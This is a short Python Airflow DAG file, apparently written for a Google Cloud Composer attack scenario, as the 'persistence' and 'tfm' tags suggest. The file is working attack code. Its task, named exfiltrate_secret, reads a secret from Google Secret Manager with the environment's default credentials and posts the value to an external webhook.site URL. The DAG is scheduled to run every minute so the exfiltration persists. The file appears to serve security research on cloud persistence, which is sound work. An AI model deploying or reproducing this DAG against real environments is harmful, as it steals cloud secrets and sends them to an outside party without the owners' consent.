from airflow.decorators import dag, task
from datetime import datetime
import requests
import google.auth
from google.cloud import secretmanager

@task
def exfiltrate_secret():
    _, project = google.auth.default()
    client = secretmanager.SecretManagerServiceClient()
    secret_name = f"projects/{project}/secrets/test-secret/versions/latest"
    response = client.access_secret_version(name=secret_name)
    secret_value = response.payload.data.decode("UTF-8")

    # Send to external webhook
    requests.post(
        "https://webhook.site/TU_URL_AQUI",
        json={"secret": secret_value}
    )

@dag(
    dag_id="escalated_dag",
    start_date=datetime(2025, 8, 4),
    schedule_interval="* * * * *",  # EJECUCIÓN CADA MINUTO
    catchup=False,
    tags=["tfm", "composer", "persistence"]
)
def my_escalated_dag():
    exfiltrate_secret()

dag = my_escalated_dag()
